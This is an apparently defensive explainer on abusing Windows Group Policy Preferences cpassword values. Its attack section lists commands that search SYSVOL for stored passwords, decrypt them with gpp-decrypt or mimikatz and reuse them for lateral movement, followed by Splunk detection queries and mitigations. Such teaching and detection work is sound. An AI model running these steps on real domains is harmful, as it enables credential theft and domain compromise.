üõ°Ô∏è Group Policy Preferences (GPP) Abuse

‚∏ª

üîπ 1. What is Group Policy Preferences (GPP)?

Group Policy Preferences (GPP) is a Windows feature introduced in Server 2008 that allowed administrators to configure and push settings (like local users, scheduled tasks, services, mapped drives, registry keys, printers, and shortcuts) to domain-joined machines.

Unlike standard Group Policy (which strictly enforces policies), Preferences could embed passwords in configuration XML files for convenience.
	‚Ä¢	These files live in the SYSVOL share, readable by all authenticated domain users:

\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\


	‚Ä¢	Files are stored as XML (e.g., Groups.xml, Services.xml, ScheduledTasks.xml).
	‚Ä¢	Passwords are stored in the cpassword attribute.
	‚Ä¢	cpassword is AES-256 encrypted with a static key that Microsoft published years ago.
	‚Ä¢	Result: any domain user can read and decrypt those passwords.

‚ö†Ô∏è Security risk: Microsoft removed the ability to set passwords via GPP in MS14-025 (2014), but old XML files often still remain in SYSVOL, and attackers still hunt for them.

‚∏ª

üîπ 2. Example of a GPP XML File

<User>
  <Properties userName="helpdesk"
              cpassword="gM2K91B6xH1EydsJ7z="
              newName="helpdesk"
              action="U" />
</User>

	‚Ä¢	userName ‚Äî target local account on endpoints.
	‚Ä¢	cpassword ‚Äî encrypted password (recoverable with the public key).

‚∏ª

üîπ 3. Attack Steps (as a Domain User)

Even with only normal domain-user permissions, an attacker can extract and decrypt GPP credentials.

Step 1 ‚Äî Enumerate SYSVOL for XML files

dir \\domain.local\SYSVOL\domain.local\Policies\ /s /b | findstr .xml

Step 2 ‚Äî Search for cpassword

findstr /si cpassword \\domain.local\SYSVOL\domain.local\Policies\*.xml

Step 3 ‚Äî Read the interesting file(s)

type "\\domain.local\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml"

Step 4 ‚Äî Decrypt the cpassword
	‚Ä¢	Using gpp-decrypt (Linux/Kali):

gpp-decrypt gM2K91B6xH1EydsJ7z=


	‚Ä¢	Using Mimikatz:

mimikatz # dpapi::gpp



‚û°Ô∏è Output might be something like: Support@123

Step 5 ‚Äî Reuse the recovered credentials

runas /user:DOMAIN\helpdesk cmd

Or use with RDP / PsExec / WMI for lateral movement.

‚∏ª

üîπ 4. Real-World Abuse
	‚Ä¢	Widely leveraged by red teams and APT actors (e.g., commonly referenced in assessments between ~2014‚Äì2018).
	‚Ä¢	Typical escalation: recover local admin or service credentials valid domain-wide ‚Üí mass lateral movement ‚Üí dump more credentials ‚Üí privilege escalation.

‚∏ª

üîπ 5. Detecting GPP Abuse in Splunk (SIEM)

Detection focuses on access to SYSVOL XML files and suspicious command lines referencing SYSVOL or cpassword.

5.1 Monitor access to GPP XML files in SYSVOL

Requires Object Access auditing (Event ID 4663) enabled on SYSVOL.

index=windows sourcetype="WinEventLog:Security"
EventCode=4663 Object_Name="*\\SYSVOL\\*\\Policies\\*\\*.xml"
| stats count values(Object_Name) as files by Account_Name, host
| where count > 0

Hunt cues: Non-admin users touching Groups.xml, Services.xml, ScheduledTasks.xml.

‚∏ª

5.2 Hunt for cpassword strings in ingested file content (if available)

index=sysvol_logs "cpassword"
| stats count values(file_path) as files by user


‚∏ª

5.3 Look for suspicious command lines referencing SYSVOL / cpassword (Sysmon EID 1)

index=windows sourcetype=Sysmon EventCode=1
(CommandLine="*\\SYSVOL\\*" OR CommandLine="*cpassword*")
| stats count values(CommandLine) as cmds by User, Computer, ParentImage


‚∏ª

üîπ 6. Location of SYSVOL

Default local path on a Domain Controller

C:\Windows\SYSVOL\sysvol\

Network share (accessible to domain users)

\\<domain.name>\SYSVOL\

Example:

\\contoso.local\SYSVOL\contoso.local\Policies\

	‚Ä¢	Replicated between DCs via FRS (old) or DFS-R (modern).
	‚Ä¢	Contains:
	‚Ä¢	Policies ‚Üí all Group Policy Objects (GUID folders, XMLs).
	‚Ä¢	Scripts ‚Üí logon/logoff/startup/shutdown scripts.

‚∏ª

üîπ 7. How to Access SYSVOL from Your Machine

If you are on a domain-joined machine:
	‚Ä¢	Use File Explorer, Run dialog, or PowerShell:

\\<domain>\SYSVOL\



If not domain-joined (but you have credentials):
	‚Ä¢	Map the share with credentials:

net use \\<domain>\SYSVOL /user:<domain>\<username> <password>


	‚Ä¢	Example:

net use \\contoso.local\SYSVOL /user:contoso\helpdesk Passw0rd!



Browsing for GPP files

Inside:

\\<domain>\SYSVOL\<domain>\Policies\*\Machine\Preferences\

Look for:
	‚Ä¢	Groups.xml
	‚Ä¢	Services.xml
	‚Ä¢	ScheduledTasks.xml

These may contain cpassword values.

‚∏ª

üîπ 8. Mermaid Diagram ‚Äî GPP Abuse Flow

flowchart TD
  A[Domain User (Low Priv)] --> B[Read SYSVOL Share<br/>\\\\domain\\SYSVOL\\domain\\Policies\\...]
  B --> C[Locate GPP XML<br/>Groups.xml / Services.xml / ScheduledTasks.xml]
  C --> D[Extract cpassword Attribute]
  D --> E[Decrypt cpassword<br/>(gpp-decrypt / mimikatz)]
  E --> F[Recovered Credentials<br/>(Local Admin / Service)]
  F --> G[Reuse Creds<br/>runas / RDP / PsExec / WMI]
  G --> H[Lateral Movement & Priv Esc]
  H --> I[Full Domain Compromise (Potential)]


‚∏ª

üîπ 9. Mitigation Guidance
	‚Ä¢	Search and purge all GPP XMLs containing cpassword.
	‚Ä¢	Rotate any credentials found in those files.
	‚Ä¢	Ensure MS14-025 patch is applied (prevents creating new GPP passwords).
	‚Ä¢	Implement Windows LAPS / LAPS-NG to randomize local admin passwords.
	‚Ä¢	Limit user access and monitor SYSVOL file access.

‚∏ª

üîπ 10. Analyst Takeaways
	‚Ä¢	What it is: GPP allowed pushing credentials domain-wide.
	‚Ä¢	Why risky: Any authenticated user can decrypt stored passwords.
	‚Ä¢	How it‚Äôs abused: Find XML ‚Üí Extract cpassword ‚Üí Decrypt ‚Üí Use creds ‚Üí Move laterally.
	‚Ä¢	Detect: Monitor file access and suspicious commands in logs.
	‚Ä¢	Fix: Purge legacy XMLs, rotate credentials, deploy LAPS.

‚∏ª

‚úÖ Summary:
Group Policy Preferences was an administrative convenience with a dangerous security side effect. Even after Microsoft‚Äôs patch, legacy cpassword files may still linger in SYSVOL, giving attackers an easy path to escalation. SOC teams must actively hunt for these files, monitor for suspicious access, and enforce modern credential management solutions.
